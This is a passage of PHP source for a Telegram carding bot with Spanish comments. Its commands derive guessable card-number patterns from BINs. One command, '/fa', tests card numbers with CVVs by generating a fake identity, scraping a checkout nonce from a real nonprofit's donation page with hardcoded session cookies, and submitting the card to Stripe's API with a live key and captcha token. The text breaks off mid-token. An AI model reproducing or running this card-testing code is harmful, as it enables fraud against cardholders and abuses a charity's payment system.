$respuesta = "".$bin_info."━━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━━•么•━━━━━━━━━━\n";

//$respuesta = "━━━━━━━•⟮ʙɪɴ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$brand."\n➭ 𝚃𝚈𝙿𝙴: ".$type."\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$name."\n➭ 𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: 💲".$currency."\n➭ 𝙱𝙰𝙽𝙺: ".$bank."\n━━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);
}
//----------------------END CHECK BIN-----------------------//




elseif((strpos($message, "!extb") === 0)||(strpos($message, "/extb") === 0)||(strpos($message, ".extb") === 0)){
/////SOLO SE USA UN BIN ///

$si = substr($message, 6);
$i1     = explode("|", $si);
$si    = $i1[0];

if (is_numeric($si) && ($si != '')){
}else{
$respuesta = "━━━━━━━•⟮ᴇxᴛ ʙᴀsɪᴄ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /extb xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !extb xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .extb xxxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}
//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//

$lista = substr($message, 6);
$i1     = explode("|", $lista);
$basic    = $i1[0];
$basica = substr("$basic", 0, 10);
$extb = "".$basica."xxxxxx";
$extb = "<code>".$extb."</code>";

$respuesta = "✰ 𝐸𝑋𝑇𝑅𝐴𝑃𝑂𝐿𝐴𝐶𝐼𝑂𝑁 𝐵𝐴𝑆𝐼𝐶𝐴 ✰\n\n° ᭄ᴛᴜ ᴇxᴛʀᴀ ᴇs:\n".$extb."\n";
editMessage($chat_id,$respuesta,$id_text);
}




elseif((strpos($message, "!exts") === 0)||(strpos($message, "/exts") === 0)||(strpos($message, ".exts") === 0)){
///SE USAN 2 BINS//
$si = substr($message, 6);
$i1     = explode("-", $si);
$si    = $i1[0];
$si1   = $i1[1];

if (is_numeric($si) && is_numeric($si1) && ($si != '') && ($si1 != '')){
}else{
$respuesta = "━━━━━━━•⟮ᴇxᴛ sɪᴍɪʟ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /exts xxx-xxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !exts xxx-xxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .exts xxx-xxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


//----------SIMILITUD----------//
$lista = substr($message, 6);
$i1     = explode("-", $lista);
$cc1    = $i1[0];
$cc2    = $i1[1];
//-----------------------------//
$bin = substr("$cc1", 0, 6);
$grupo1 = substr("$cc1", 6, 10);
$grupo2 = substr("$cc2", 6, 10);
//---------------BASICA-----------------/
$R1 = substr("$grupo1", 0, 1);
$R2 = substr("$grupo1", 1, 1);
$R3 = substr("$grupo1", 2, 1);
$R4 = substr("$grupo1", 3, 1);
$R5 = substr("$grupo1", 4, 1);
$R6 = substr("$grupo1", 5, 1);
$R7 = substr("$grupo1", 6, 1);
$R8 = substr("$grupo1", 7, 1);
$R9 = substr("$grupo1", 8, 1);
$R01 = substr("$grupo1", 9, 1);
//----------------------------
$R11 = substr("$grupo2", 0, 1);
$R12 = substr("$grupo2", 1, 1);
$R13 = substr("$grupo2", 2, 1);
$R14 = substr("$grupo2", 3, 1);
$R15 = substr("$grupo2", 4, 1);
$R16 = substr("$grupo2", 5, 1);
$R17 = substr("$grupo2", 6, 1);
$R18 = substr("$grupo2", 7, 1);
$R19 = substr("$grupo2", 8, 1);
$R10 = substr("$grupo2", 9, 1);
///-------------------------------//
if($R1 == "$R11" ){
$J1 = "$R1";
}else{
$J1 = "x";
}
if($R2 == "$R12" ){
$J2 = "$R2";
}else{
$J2 = "x";
}
if($R3 == "$R13" ){
$J3 = "$R3";
}else{
$J3 = "x";
}
if($R4 == "$R14" ){
$J4 = "$R4";
}else{
$J4 = "x";
}
if($R5 == "$R15" ){
$J5 = "$R5";
}else{
$J5 = "x";
}
if($R6 == "$R16" ){
$J6 = "$R6";
}else{
$J6 = "x";
}
if($R7 == "$R17" ){
$J7 = "$R7";
}else{
$J7 = "x";
}
if($R8 == "$R18" ){
$J8 = "$R8";
}else{
$J8 = "x";
}
if($R9 == "$R19" ){
$J9 = "$R9";
}else{
$J9 = "x";
}
if($R01 == "$R10" ){
$J10 = "$R01";
}else{
$J10 = "x";
}

$extra = "$bin$J1$J2$J3$J4$J5$J6$J7$J8$J9$J10";
$extra = "<code>".$extra."</code>";
$respuesta = "✰ 𝐸𝑋𝑇𝑅𝐴𝑃𝑂𝐿𝐴𝐶𝐼𝑂𝑁 𝑆𝐼𝑀𝐼𝐿𝐼𝑇𝑈𝐷 ✰\n\n° ᭄ᴛᴜ ᴇxᴛʀᴀ ᴇs:\n".$extra."\n";
editMessage($chat_id,$respuesta,$id_text);
}


elseif((strpos($message, "!exta") === 0)||(strpos($message, "/exta") === 0)||(strpos($message, ".exta") === 0)){
///SE USAN 2 BINS DEL MISMO BIN :V//

$si = substr($message, 6);
$i1     = explode("-", $si);
$si    = $i1[0];
$si1   = $i1[1];

if (is_numeric($si) && is_numeric($si1) && ($si != '') && ($si1 != '')){

}else{
$respuesta = "━━━━━━━•⟮ᴇxᴛ ᴀᴠᴀɴᴢ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /exta xxx-xxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !exta xxx-xxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .exta xxx-xxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


//-------AVANZADA----------//
$lista = substr($message, 6);
$i1     = explode("-", $lista);
$cc1    = $i1[0];
$cc2    = $i1[1];
//-----------------------------//
$com = substr("$cc1", 0, 6);
$con = substr("$cc2", 0, 6);
if($com == "$con" )
{
} else {
$respuesta =  "Las ccs no son del mismo bin !!!\n";
editMessage($chat_id,$respuesta,$id_text);
die();
}
//-----------------------------//
$bin = substr("$cc1", 0, 6);
$cc = substr("$cc1", 0, 8);
$grupo1 = substr("$cc1", 9, 2);
$grupo2 = substr("$cc2", 9, 2);
//-----------------------------//
$sum11 = substr("$grupo1", 0, 1);
$sum12 = substr("$grupo2", 0, 1);
$suma1 = $sum11+$sum12;
//-----------------------------//
$sum21 = substr("$grupo1", 1, 1);
$sum22 = substr("$grupo2", 1, 1);
$suma2 = $sum21+$sum22;
//-----------------------------//
$div1 = $suma1/2;
$div2 = $suma2/2;
//-----------------------------//
$mult1 = $div1*5;
$mult2 = $div2*5;
//-----------------------------//
$gre1 = explode(".", $mult1);
$uno  = $gre1[0];
$gre2 = explode(".", $mult2);
$dos  = $gre2[0];
//-----------------------------//
$fina = $uno+$dos;


$extra = "$cc".$fina."xxxxxx";
$extra = "<code>".$extra."</code>";
$respuesta = "✰ 𝐸𝑋𝑇𝑅𝐴𝑃𝑂𝐿𝐴𝐶𝐼𝑂𝑁 𝐴𝑉𝐴𝑁𝑍𝐴𝐷𝐴 ✰\n\n° ᭄ᴛᴜ ᴇxᴛʀᴀ ᴇs:\n".$extra."\n";
editMessage($chat_id,$respuesta,$id_text);
}


elseif((strpos($message, "!exti") === 0)||(strpos($message, "/extl") === 0)||(strpos($message, ".extl") === 0)){
///SE USA SOLO 1 BIN//

$si = substr($message, 6);
$i1     = explode("|", $si);
$si    = $i1[0];

if (is_numeric($si) && ($si != '')){
}else{
$respuesta = "━━━━━━━•⟮ᴇxᴛ ɪɴᴅᴇɴᴛ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /exti xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !exti xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .exti xxxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


//MaTerialDInVerter
$lista = substr($message, 6);
$i1     = explode("|", $lista);
$cc1    = $i1[0];
//-----------------------------//
$bin = substr("$cc1", 0, 6);
$cc = substr("$cc1", 6, 10);
$uno = substr("$cc", 0, 3);
$dos = substr("$cc", 3, 4);
$tres = substr("$cc", 7, 3);
//-----------------------------//
$to1 = substr("$uno", 1, 1);
$to2 = substr("$dos", 1, 2);
$to3 = substr("$tres", 1, 1);
//-----------------------------//
$fin1 = str_replace($to1, 'x', $uno);
$fin2 = str_replace($to2, 'xx', $dos);
$fin3 = str_replace($to3, 'x', $tres);


$extra = "$bin$fin1$fin2$fin3";
$extra = "<code>".$extra."</code>";
$respuesta = "✰ 𝐸𝑋𝑇𝑅𝐴𝑃𝑂𝐿𝐴𝐶𝐼𝑂𝑁 𝐼𝑁𝐷𝐸𝑁𝑇𝐴𝐶𝐼𝑂𝑁 ✰\n\n° ᭄ᴛᴜ ᴇxᴛʀᴀ ᴇs:\n".$extra."\n";
editMessage($chat_id,$respuesta,$id_text);

}




elseif((strpos($message, "!extm") === 0)||(strpos($message, "/extm") === 0)||(strpos($message, ".extm") === 0)){


$si = substr($message, 6);
$i1     = explode("-", $si);
$si    = $i1[0];
$si1   = $i1[1];

if (is_numeric($si) && is_numeric($si1) && ($si != '') && ($si1 != '')){
}else{
$respuesta = "━━━━━━━•⟮ᴇxᴛ sʜᴏᴘɪᴀ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /extm xxx-xxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !extm xxx-xxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .extm xxx-xxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


//-----------MaTerialDInVerter----------//
//4915110176928790-4915110191768499

$lista = substr($message, 6);
$i1     = explode("-", $lista);
$cc1    = $i1[0];
$cc2    = $i1[1];
//------Similitud basica----------//
$T1grupo1 = substr("$cc1", 8, 10);
//-----------------------------//

$T2grupo1 = substr("$cc2", 0, 8);
$T2grupo2 = substr("$cc2", 8, 8);
//----1-----//
$T11 = substr("$T2grupo1", 0, 1);
$T21 = substr("$T2grupo2", 0, 1);
//----1-----//
$T12 = substr("$T2grupo1", 1, 1);
$T22 = substr("$T2grupo2", 1, 1);
//----1-----//
$T13 = substr("$T2grupo1", 2, 1);
$T23 = substr("$T2grupo2", 2, 1);
//----1-----///
$T14 = substr("$T2grupo1", 3, 1);
$T24 = substr("$T2grupo2", 3, 1);
//----1-----///
$T15 = substr("$T2grupo1", 4, 1);
$T25 = substr("$T2grupo2", 4, 1);
//----1-----///
$T16 = substr("$T2grupo1", 5, 1);
$T26 = substr("$T2grupo2", 5, 1);
//----1-----///
$T17 = substr("$T2grupo1", 6, 1);
$T27 = substr("$T2grupo2", 6, 1);
//----1-----///
$T18 = substr("$T2grupo1", 7, 1);
$T28 = substr("$T2grupo2", 7, 1);
//----1-----///
$T19 = substr("$T2grupo1", 8, 1);
$T29 = substr("$T2grupo2", 8, 1);
//---------------------------------//
$mult1 = $T11*$T21;
$mult2 = $T12*$T22;
$mult3 = $T13*$T23;
$mult4 = $T14*$T24;
$mult5 = $T15*$T25;
$mult6 = $T16*$T26;
$mult7 = $T17*$T27;
$mult8 = $T18*$T28;
//---------------------------------//
$suma = "$mult1$mult2$mult3$mult4$mult5$mult6$mult7$mult8";
$die3 = substr("$suma", 0, 8);
$listo = "$T2grupo1$die3";
$grupo2 = substr("$listo", 8, 10);
$ext6 = substr("$listo", 0, 6);
//---------------BASICA-----------------/
$R1 = substr("$grupo2", 0, 1);
$R2 = substr("$grupo2", 1, 1);
$R3 = substr("$grupo2", 2, 1);
$R4 = substr("$grupo2", 3, 1);
$R5 = substr("$grupo2", 4, 1);
$R6 = substr("$grupo2", 5, 1);
$R7 = substr("$grupo2", 6, 1);
$R8 = substr("$grupo2", 7, 1);
//----------------------------
$R11 = substr("$T1grupo1", 0, 1);
$R12 = substr("$T1grupo1", 1, 1);
$R13 = substr("$T1grupo1", 2, 1);
$R14 = substr("$T1grupo1", 3, 1);
$R15 = substr("$T1grupo1", 4, 1);
$R16 = substr("$T1grupo1", 5, 1);
$R17 = substr("$T1grupo1", 6, 1);
$R18 = substr("$T1grupo1", 7, 1);
///-------------------------------//
if($R11 == "$R1" ){
$J1 = "$R11";
}else{
$J1 = "x";
}
if($R12 == "$R2" ){
$J2 = "$R12";
}else{
$J2 = "x";
}
if($R13 == "$R3" ){
$J3 = "$R13";
}else{
$J3 = "x";
}
if($R14 == "$R4" ){
$J4 = "$R14";
}else{
$J4 = "x";
}
if($R15 == "$R5" ){
$J5 = "$R15";
}else{
$J5 = "x";
}
if($R16 == "$R6" ){
$J6 = "$R16";
}else{
$J6 = "x";
}
if($R17 == "$R7" ){
$J7 = "$R7";
}else{
$J7 = "x";
}
if($R18 == "$R8" ){
$J8 = "$R18";
}else{
$J8 = "x";
}
//---------------------------------//
if($J8 == "x" ){
$J9 = "1";
}else{
$J9 = "$R18";
}

$extra = "$ext6$J1$J2$J3$J4$J5$J6$J7$J9";
$extra = "<code>".$extra."</code>";
$respuesta = "✰ 𝐸𝑋𝑇𝑅𝐴𝑃𝑂𝐿𝐴𝐶𝐼𝑂𝑁 𝑆𝑂𝑃𝐻𝐼𝐴 ✰\n\n° ᭄ᴛᴜ ᴇxᴛʀᴀ ᴇs:\n".$extra."\n";
editMessage($chat_id,$respuesta,$id_text);

}





elseif((strpos($message, "!fa") === 0)||(strpos($message, "/fa") === 0)||(strpos($message, ".fa") === 0)){

$lista = substr($message, 4);
//$i     = explode("|", $lista);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = trim(substr($i[2], -2));
$cvv   = $i[3];

$bin = substr($lista, 0, 6);
////
$num = "$cc$mes$ano$cvv";

$verify = substr($cc, 16, 1);
if($verify != ""){
$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}

if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
}else{
$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /fa cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !fa cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .fa cc|m|y|cvv\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//

$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin
	
//RANDOM USER//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$get = curl_exec($ch);
curl_close($ch);
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://facesandvoicesofrecovery.org/engage/donate/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'wordpress_logged_in_508923f30af7c37ea20c1d6887bb80bd=carlos.perez%7C1731729744%7Cp7KAvNle7Z1J9WwkLyQ4PTMeq1zNEmuc8436DoPO1Gc%7C358a3a02a21c66e436aeb6c84464c7c513b7cb769cf0952f36dd1cb596190913; wfwaf-authcookie-084fa67f8cdb5120d8f1ead9606207d0=19092%7Cother%7Cread%7Cd3fc84ddf757273bc068194acf1e986b13cb094ebcc3ce59dbd6f46031f024ea; woocommerce_items_in_cart=1; woocommerce_cart_hash=c73fc674d47101bf3c9ebdaef484e9dc; wp_woocommerce_session_508923f30af7c37ea20c1d6887bb80bd=19092%7C%7C1731724262%7C%7C1731720662%7C%7Ce40ce29008ab8337ffd6a94f35e07914; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-14%2002%3A29%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2Fcheckout%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-14%2002%3A29%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2Fcheckout%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; __stripe_mid=e8398605-f154-4877-b187-a7cee3a338b74c2226; __stripe_sid=8fbaf3a4-34e1-4d60-8833-357ce1408ef8e06a35; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2Fengage%2Fdonate%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'upgrade-insecure-requests: 1',
    'accept-language: es-US,es;q=0.9',
    'referer: https://facesandvoicesofrecovery.org/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/name="woocommerce-process-checkout-nonce" value="([a-zA-Z0-9]+)"/';
preg_match($patron, $response, $coincidencias);
$nonce = $coincidencias[1];
curl_close($curl);
echo "$nonce\n";


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'billing_details%5Bname%5D='.$name.'+'.$last.'&billing_details%5Bemail%5D='.$email.'&billing_details%5Bphone%5D='.$phone.'&billing_details%5Baddress%5D%5Bcity%5D='.$city.'&billing_details%5Baddress%5D%5Bcountry%5D=US&billing_details%5Baddress%5D%5Bline1%5D='.$street.'&billing_details%5Baddress%5D%5Bline2%5D=&billing_details%5Baddress%5D%5Bpostal_code%5D='.$postcode.'&billing_details%5Baddress%5D%5Bstate%5D='.$state.'&type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F04e5aa74c1%3B+stripe-js-v3%2F04e5aa74c1%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ffacesandvoicesofrecovery.org&time_on_page=37795&client_attribution_metadata%5Bclient_session_id%5D=7f391aa9-babf-49ee-a397-86e12a599308&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=a236ec11-4754-46eb-9c61-23ad7766e882872b7b&muid=e8398605-f154-4877-b187-a7cee3a338b74c2226&sid=8fbaf3a4-34e1-4d60-8833-357ce1408ef8e06a35&key=pk_live_51EkCnzKp81anl5QIKzwBcjWRkc7CcluE8E7Y8ruaRVcOd5ATfw8Ian4jgMhds0gVbhGo6fRie8IQbm4znjUeblBA00HrWAWM5Y&_stripe_version=2024-06-20&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoicWppT25DcXZGYVBOMmJHMUhIWjBVdXFoM1lGRERXU1Z2NE9nNVQzTlpzVkJzSFdWeTJKeEdzS2dya0szb2ZhSTZwWEdCM2JEZUxySDNxTG5sMXlmWWZQNUhvTUlINy9BOHVBa3lhd05LV1lSU1VyZ2ZtRWJoZHdaZXVtYmJveUlPSGFZcjJJYmlRTDFSNXM4YStWdGEzWStHYUEydWFSeW1VY2ZEYk9aWEdRVkVUcGhrS0VlSERnK3BGVVJyZ3NzMG1nL0NCNkZhYlZkSmFLSEpCaWhBMVVGYXNVYVliRS8yaFEwNi9Kd1NDRjM4YlM4WDVQNmZrUjFhT1JKVUUvK0ljOEM0M0NSZWI0dEtQdmNaZjZmdCtzMzhZdEdZc3RHRThTWjdWdFRMVzMwRkhFcCtnOU5PRGhGa3lZYmpPTGZobDFFUkRrWlhOc0JJTVhjQURJU1ZhbzFLSW10TS8xWXBIeXQ1SzRxd2ZOSTE4eEJ5WVdmKzZqWWc2eE9Kc1VCcUVWam5YclZlMUFJT0FsaU1iOUtrTzdONDV2N3l0a3ZWbEpUVldXVkhhNjE1akUwYUw0cEhKdTZRcDlnN3VIQzhoL0hrUnRJQno1UEhZT21GYWNUYzJGUit6MllmZXAyL21VVEdwNGo4SjVQU0dBM0dSekhmeUlSMEk2VTFiL1lwSGIwMG9UckkvL1g4TjZ1T09MSUVxU0kwckN5eTE0V0FSSkhoTHBnaERXNWRUKzB5SXAzblNoWnUreVZ1SFlybFlRY1djeXY1TFhLQXNhc0h6aW1TTUdJeERTWEx1U1crRjVPcDBHRmcvZjRiclYySjdJQTRQb3NzbVN2dE5odUNCbVJma2hBRkxUbzZXNHZ0YTlrSERoNUNEVlRQYU9lQWxMMm5NQ0kxRUZadHNDUFZvUzZmcGpSSXNqZ2U0QmFablZtbTB4UmlkY2wwazlDdXBZZWZKczc3VXc1dktLdFdkakR5YmNIaGRmUUhvN1FvS2tYdkl3YXN5ckFkZ2lZYnhyWUNzd2wrR09sWVljd2RvVU8xMVpEZDVYazZQNFRMeTEwV3pkeXRmTWl2ZkZBQnFaZlFvQTNLYjlWaXNYMFVZMnoxTFhkS0s4a2IzVUhJTmVoR3FwdnllZDBzVVlvdmE2VlFBZnZZSDZUbVZoS0NYdDhGN0xmQXEvK3h2eWlXV3IraXB0elFERnpsM1gwWm5JemMyejhXZFpZQWVucnBXYXNuMzhpQnJPZlFkZVcrd3ZxNkdEczRpM1p5QTc1VHNTSjJzMGQvY04yRi9Oci8rMm5MNUlkelNmcWNMeGEvT2ZBeGlEVDUvODdjdFF4b0d3bVhoemNxaGR4TG5jdXpZcGtPN1NnWWF4SzZ1aFFYbklDckg5MWhnRWp2bTRRTXZEZnRweW9hbDRESURSSmlhNUt0cnQ3bXdUMWdDdFllWFE2cjRQYkxpMm5ZTEF4ZUtPSzI2NzhsbjB0YVB4UEFDSDlDOXJ6aHh0ZkN6VXZ3cHBObTAyWmFKREFDZHJud01tQ0xkSER3bExGdUxQQkJKN2N6S2huK09PM3hUcmlBcXY3SzVrcjVPWnJHN0RxWDdFZy80MXFnc2MzeEd4QzAyR3NDL1NqMTBudWl4ZXd3TGpuQ3d3U2FnK2FvbEc0SHQxVVVsQ29pbXluNU5nQUFlVmZnaUFjc3RaZjBJYTdFb3JVeVJtZk5mbURjUTBlTG5UckRlaWZDSy91Ty94d0xkN0szM2NkbTMzRS9iMW9SMmFqazM3VUNtUFR0SC9kVjhpV21mSGtJbUg1bmNoOXNYQjl0cGhRQ2ZiQmZXaE01ZGZ2ODNIb2NtSHU2ckVtQ2puU1kyVTdITFZYQUw5TWh1R3NVSVdjcUlaeVJoYWtZZGJwcG1NV3cvY1pVODNkY1V6T2dmK2ttQ3dyckFTK1FQMUVzRHVNTWdFNy81WVdDSjFsM0RvMTBGc3grdk9OcmYyMFRjTlhMTXdqQVpDWm1jOEZXQWR2T3dEcFlCeFlGNW8yRFRQa0doa1lPWmVFdHp5dHV4ZU84a2UvRHQzbFBPZTR2WUNBRkJ5ekxBakVSVVoyRGlod1hDQlUrQ0lJWkVpb1RCOFZ6WUJwSFF5UzNtU09QVUVndnoyc3Ezb1NqWVB1QS9GbzBjRGYxNEpLbWh1UWZHaHRkS0xaazlNYU9WUWpMcFIvZU4rOFVKRDlvaW8zc2psVkdWNXdnbDZ3WUdrb2s0bXNjblRMY0EyQXBIMkdTOWFBbkZvM3I4VUpSRU01eXNlcUlkVVkzUEZNVEs4cmhIdWkwTVdDTU9MbUpZMm9tYnMwTEthMXhOVHNOQkhsajB6RFZ4KytUREYrQTBXWTh6UTY0VHdRUWdJZEtuK2hOVk1kVGF4bDJCbTRlOUdSN2h1eDRpVmVpanRYOEhSenpISElWemJGVG5FSk1qYWMyY282My9PeU44TmRKNXpvL2pTQ3F4NTdudkNZQk1kTXpPVzVTLzh5eEY4MWJnNkVOZmJxUm9FWWcrQWcvR0czQlZNZk92L1UxUUVSS0VnbmJLeFkrc25VZDhYRTErcXd0aU1qUFBkZGVZVWc5dWVtaG9qYkxUSFBHOGVaeHRXdzg4WkFQMGZINTUvVE8waGwweHBuOXNJeEZ6bjhjRDdDZUo2Vk42bFhIZWExZXJnMnJBMVY1d1p2TGFaSmNGeTlEdWhBTnZlNFBMVjlFdTFhNzlFRzNCenZtVGhFc09IcjVFSVVGczc0bUs2MEJmMGZsaFVnSThNQ3ZWMTZsK2pXQis3YU5rdkQ5YmM9IiwiZXhwIjoxNzMxNTUxNzAwLCJzaGFyZF9pZCI6MjIxOTk2MDczLCJrciI6IjMzMzVjMSIsInBkIjowLCJjZGF0YSI6IkdLVTB4N21vdFd5YnhYK3dTMUtXZkxIWXU3TlJBNUllVGJUaUt1eW5